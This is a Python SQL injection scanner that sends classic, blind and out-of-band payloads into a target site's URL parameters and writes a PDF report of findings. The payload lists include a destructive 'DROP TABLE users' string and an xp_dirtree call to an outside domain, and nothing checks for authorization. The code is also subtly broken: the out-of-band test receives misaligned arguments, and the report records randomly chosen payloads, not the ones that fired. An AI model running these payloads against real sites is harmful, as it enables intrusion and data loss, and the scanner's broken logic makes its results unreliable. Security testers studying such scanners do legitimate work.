import requests
from bs4 import BeautifulSoup
import re
import time
import random
import json
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
from reportlab.lib.pagesizes import letter
from reportlab.lib import colors
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle


REQUEST_TIMEOUT = 10 
RATE_LIMIT_DELAY = 3


def test_classic_sqli(url, param, payloads):
    sql_errors = [
        "You have an error in your SQL syntax;",
        "mysql_fetch_array()",
        "Warning: mysql_",
        "Warning: pg_",
        "Warning: odbc_",
        "Warning: mssql_",
        "ORA-01756",
        "Error Executing Database Query",
        "Unclosed quotation mark after the character string"
    ]

    for payload in payloads:
        try:
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            query_params[param] = payload
            new_query = urlencode(query_params, doseq=True)
            target_url = urlunparse(parsed_url._replace(query=new_query))

            response = requests.get(target_url, timeout=REQUEST_TIMEOUT)
            time.sleep(RATE_LIMIT_DELAY)
            html_content = response.text

            for error in sql_errors:
                if error in html_content:
                    return True
        except requests.exceptions.RequestException as e:
            print(f"Request error: {e}")

    return False


def test_blind_sqli(url, param, payloads_true, payloads_false):
    for payload_true, payload_false in zip(payloads_true, payloads_false):
        try:
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)

            query_params[param] = payload_true
            new_query_true = urlencode(query_params, doseq=True)
            target_url_true = urlunparse(parsed_url._replace(query=new_query_true))

            query_params[param] = payload_false
            new_query_false = urlencode(query_params, doseq=True)
            target_url_false = urlunparse(parsed_url._replace(query=new_query_false))

            response_true = requests.get(target_url_true, timeout=REQUEST_TIMEOUT)
            time.sleep(RATE_LIMIT_DELAY)
            response_false = requests.get(target_url_false, timeout=REQUEST_TIMEOUT)
            time.sleep(RATE_LIMIT_DELAY)

            if response_true.status_code == 200 and response_false.status_code == 404:
                return True
        except requests.exceptions.RequestException as e:
            print(f"Request error: {e}")

    return False


def test_out_of_band_sqli(url, param, payloads, domain, bin_id, api_key):
    for payload in payloads:
        try:
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            query_params[param] = payload
            new_query = urlencode(query_params, doseq=True)
            target_url = urlunparse(parsed_url._replace(query=new_query))

            response = requests.get(target_url, timeout=REQUEST_TIMEOUT)
            time.sleep(RATE_LIMIT_DELAY)

            if check_dns_logs(bin_id, api_key):
                return True
        except requests.exceptions.RequestException as e:
            print(f"Request error: {e}")

    return False


def check_dns_logs(bin_id, api_key):
    requestbin_url = f"https://api.requestbin.com/v1/bins/{bin_id}/requests"
    headers = {"X-Master-Key": api_key}

    try:
        response = requests.get(requestbin_url, headers=headers)
        if response.status_code == 200:
            requests_data = json.loads(response.text)
            if len(requests_data) > 0:
                return True
    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")

    return False


def test_sql_injection(url, params, bin_id, api_key):
    domain = input('Enter a domain name to use for the out-of-band SQLi attack: ')

    classic_payloads = [
        "'", "\"", "or 1=1", "'; DROP TABLE users;--", "1' or '1' = '1", "\" OR \"\"=\""
    ]

    blind_payloads_true = [
        "1' AND 1=1--", "1' AND SLEEP(3)--", "1') AND 1=1--", "1') AND SLEEP(3)--"
    ]

    blind_payloads_false = [
        "1' AND 1=2--", "1' AND SLEEP(0)--", "1') AND 1=2--", "1') AND SLEEP(0)--"
    ]

    out_of_band_payloads = [
        f"1'; EXEC xp_dirtree 'http://{domain}.example.com';--"
    ]

    results = []


    for param in params:
        if test_classic_sqli(url, param, classic_payloads):
            results.append((param, "Classic SQLi", random.choice(classic_payloads)))

        if test_blind_sqli(url, param, blind_payloads_true, blind_payloads_false):
            results.append((param, "Inferential SQLi (Blind)", (random.choice(blind_payloads_true), random.choice(blind_payloads_false))))

        if test_out_of_band_sqli(url, param, out_of_band_payloads, bin_id, api_key):
            results.append((param, "Out-of-band SQLi", random.choice(out_of_band_payloads)))

    return results


def generate_pdf_report(results, filename):
    data = [["Parameter", "Vulnerability", "Payload"]] + results

    table = Table(data)
    table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
        ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
        ('FONTSIZE', (0, 0), (-1, 0), 14),
        ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
        ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
        ('GRID', (0, 0), (-1, -1), 1, colors.black)
    ]))

    doc = SimpleDocTemplate(filename, pagesize=letter)
    doc.build([table])


if __name__ == "__main__":
    target_url = input('Enter the URL of the target website: ')
    params = input('Enter the parameters to test (comma-separated): ').split(',')

    bin_id = input('Enter the ID of the RequestBin: ')
    api_key = input('Enter the API key of the RequestBin: ')

    results = test_sql_injection(target_url, params, bin_id, api_key)

    for result in results:
        print(f"Vulnerability found: {result[1]} - Parameter: {result[0]} - Payload: {result[2]}")

    pdf_filename = f"{target_url}-sql_injection_report.pdf"
    generate_pdf_report(results, pdf_filename)
    print(f"Report generated: {pdf_filename}")


